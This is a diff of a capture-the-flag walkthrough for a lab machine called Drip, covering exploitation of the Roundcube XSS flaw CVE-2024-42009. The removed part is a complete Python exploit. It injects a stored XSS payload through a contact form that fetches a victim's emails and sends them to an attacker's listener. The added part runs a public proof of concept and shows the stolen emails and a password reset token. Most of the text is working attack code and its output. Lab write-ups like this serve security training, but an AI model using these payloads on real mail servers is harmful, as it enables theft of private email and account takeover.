@@ -88,136 +88,75 @@ An email `bcase@drip.htb` is discovered that can be used for the XSS exploit:
 
 ![](https://github.com/user-attachments/assets/82b2372e-c795-4173-8b39-b7a8024f6d0c)
 
-Found exploit code for CVE-2024-42009:
-1. Adjust `http://10.10.14.3:8000` to kali IP address to reflect the information to correct location
-2. Adjust `message = 2` to change the UID of the email to retrieve by `?_task=mail&_action=show&_uid=`
-
-```python
-import requests
-from http.server import BaseHTTPRequestHandler, HTTPServer
-import base64
-import threading
-from lxml import html
-
-# Configuration
-TARGET_URL = 'http://drip.htb/contact'
-LISTEN_PORT = 8000
-LISTEN_IP = '0.0.0.0'
-
-# Payload for the POST request
-start_mesg = '<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch(\'/?_task=mail&_action=show&_uid='
-message = 2
-end_mesg = '&_mbox=INBOX&_extwin=1\').then(r=>r.text()).then(t=>fetch(`http://10.10.14.3:8000/c=${btoa(t)}`)) foo=bar">Foo</body>'
-
-post_data = {
-    'name': 'test',
-    'email': 'test@drip.htb',
-    'message': f"{start_mesg}{message}{end_mesg}",
-    'content': 'html',
-    'recipient': 'bcase@drip.htb'
-}
-print(f"{start_mesg}{message}{end_mesg}")
-
-# Headers for the POST request
-headers = {
-    'Host': 'drip.htb',
-    'Cache-Control': 'max-age=0',
-    'Upgrade-Insecure-Requests': '1',
-    'Origin': 'http://drip.htb',
-    'Content-Type': 'application/x-www-form-urlencoded',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'Referer': 'http://drip.htb/index',
-    'Accept-Encoding': 'gzip, deflate, br',
-    'Accept-Language': 'en-US,en;q=0.9',
-    'Cookie': 'session=eyJfZnJlc2giOmZhbHNlfQ.aMTEkA.kLDBkDWeSgzVjLHOIUq6hZEF8CE',
-    'Connection': 'close'
-}
-
-# Function to send the POST request
-def send_post():
-    response = requests.post(TARGET_URL, data=post_data, headers=headers)
-    print(f"[+] POST Request Sent! Status Code: {response.status_code}")
-
-# Custom HTTP request handler to capture and decode the incoming data
-class RequestHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        if '/c=' in self.path:
-            encoded_data = self.path.split('/c=')[1]
-            decoded_data = base64.b64decode(encoded_data).decode('latin-1')
-            print(f"[+] Received data {decoded_data}")
-            tree = html.fromstring(decoded_data)
-
-            # XPath query to find the div with id 'messagebody'
-            message_body = tree.xpath('//div[@id="messagebody"]')
-           
-            # Check if the div exists and extract the content
-            if message_body:
-                # Extract inner text, preserving line breaks
-                message_text = message_body[0].text_content().strip()
-                print("[+] Extracted Message Body Content:\n")
-                print(message_text)
-            else:
-                print("[!] No div with id 'messagebody' found.")
-
-        else:
-            print("[!] Received request but no data found.")
-
-        self.send_response(200)
-        self.end_headers()
-        self.wfile.write(b'OK')
-
-    def log_message(self, format, *args):
-        return  # Suppress default logging
-
-# Function to start the HTTP server
-def start_server():
-    server_address = (LISTEN_IP, LISTEN_PORT)
-    httpd = HTTPServer(server_address, RequestHandler)
-    print(f"[+] Listening on port {LISTEN_PORT} for exfiltrated data...")
-    httpd.serve_forever()
-
-# Run the HTTP server in a separate thread
-server_thread = threading.Thread(target=start_server)
-server_thread.daemon = True
-server_thread.start()
-
-# Send the POST request
-send_post()
-
-# Keep the main thread alive to continue listening
-try:
-    while True:
-        pass
-except KeyboardInterrupt:
-    print("\n[+] Stopping server.")
-```
-
-
-Run the exploit:
+Prepare [CVE-2024-42009-PoC](https://github.com/DaniTheHack3r/CVE-2024-42009-PoC):
 
 ```console
-root@kali:~# python3 exploit.py
-<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch('/?_task=mail&_action=show&_uid=2&_mbox=INBOX&_extwin=1').then(r=>r.text()).then(t=>fetch(`http://10.10.14.3:8000/c=${btoa(t)}`)) foo=bar">Foo</body>
-[+] Listening on port 8000 for exfiltrated data...
-[+] POST Request Sent! Status Code: 200
-[+] Received data <!DOCTYPE html>
+root@kali:~# git clone https://github.com/DaniTheHack3r/CVE-2024-42009-PoC
+Cloning into 'CVE-2024-42009-PoC'...
+remote: Enumerating objects: 9, done.
+remote: Counting objects: 100% (9/9), done.
+remote: Compressing objects: 100% (9/9), done.
+remote: Total 9 (delta 2), reused 4 (delta 0), pack-reused 0 (from 0)
+Receiving objects: 100% (9/9), 8.00 KiB | 8.00 MiB/s, done.
+Resolving deltas: 100% (2/2), done.
+
+root@kali:~# python3 -m venv CVE-2024-42009-PoC
+
+root@kali:~# cd CVE-2024-42009-PoC/
+
+root@kali:~/CVE-2024-42009-PoC# bin/pip3 install -r requirements.txt
+⋮
+⋮
+Successfully installed Mako-1.3.10 MarkupSafe-3.0.2 PyNaCl-1.5.0 PySocks-1.7.1 Pygments-2.19.1 ROPGadget-7.6 bcrypt-4.3.0 beautifulsoup4-4.13.4 capstone-6.0.0a4 certifi-2025.4.26 cffi-1.17.1 charset-normalizer-3.4.2 colored-traceback-0.4.2 cryptography-45.0.2 idna-3.10 intervaltree-3.1.0 packaging-25.0 paramiko-3.5.1 plumbum-1.9.0 psutil-7.0.0 pwntools-4.14.1 pycparser-2.22 pyelftools-0.32 pyserial-3.5 python-dateutil-2.9.0.post0 requests-2.32.3 rpyc-6.0.2 six-1.17.0 sortedcontainers-2.4.0 soupsieve-2.7 typing_extensions-4.13.2 unicorn-2.1.2 unix-ar-0.2.1 urllib3-2.4.0 zstandard-0.23.0
+```
+
+Execute the exploit:
+
+```console
+root@kali:~/CVE-2024-42009-PoC# bin/python3 exploit.py -u http://drip.htb/contact -r bcase@drip.htb -l 10.10.14.3 -p 4444
+[*] Crafting payload for http://drip.htb/contact with recipient bcase@drip.htb
+[*] Sending payload to http://drip.htb/contact with recipient bcase@drip.htb
+[*] Starting HTTP server on port 4444
+[+] HTTP server listening on port 4444
+[*] Waiting for emails... (Press Ctrl+C to stop manually)
+[*] POST request to: /?emails=found
+[+] Received 3 emails!
 ```
 
 Receive information:
 
 ```console
-[+] Extracted Message Body Content:
+------------------------------------------------------------
+📧 EMAIL UID: 1
+------------------------------------------------------------
+From: no-reply@drip.htb
+Subject: Welcome to DripMail
 
+Message:
+Hi bcase,
+Welcome to DripMail! We're excited to provide you with convenient email solutions! If you need help, please reach out to us at
+support@drip.htb
+.
+------------------------------------------------------------
+
+
+------------------------------------------------------------
+📧 EMAIL UID: 2
+------------------------------------------------------------
+From: ebelford
+Subject: Analytics Dashboard
+
+Message:
 Hey Bryce,
-
 The Analytics dashboard is now live. While it's still in development and limited in functionality, it should provide a good starting point for gathering metadata on the users currently using our service.
-
 You can access the dashboard at dev-a3f1-01.drip.htb. Please note that you'll need to reset your password before logging in.
-
 If you encounter any issues or have feedback, let me know so I can address them promptly.
-
 Thanks
+------------------------------------------------------------
+
+[+] Email exfiltration complete! Shutting down server...
+[*] Shutting down server...
+[+] Server stopped successfully!
 ```
 
 ### 2.3. Getting access to `dev-a3f1-01.drip.htb`
@@ -228,14 +167,20 @@ Thanks
 
 ![](https://github.com/user-attachments/assets/4bc048cf-0899-46ac-97c9-f7675e4b510c)
 
-Adjust `message = 3` to change the UID of the email to retrieve and get the password reset URL:
+Run the CVE-2024-42009 exploit again to receive the password reset link:
 
 ```console
-[+] Extracted Message Body Content:
+------------------------------------------------------------
+📧 EMAIL UID: 3
+------------------------------------------------------------
+From: no-reply@drip.htb
+Subject: Reset token
 
+Message:
 Your reset token has generated.  Please reset your password within the next 5 minutes.
-
-You may reset your password here: http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.aMTMMg.l-r8fRl37TG9zNEF9l-ZG4W_XwA
+You may reset your password here:
+http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.aMT8tg.jgx5a6ktRvXvrWoyf2rimlViZqE
+------------------------------------------------------------
 ```
 
 ![](https://github.com/user-attachments/assets/2a17c94a-5c16-4cd1-97b0-3d2be55369fb)
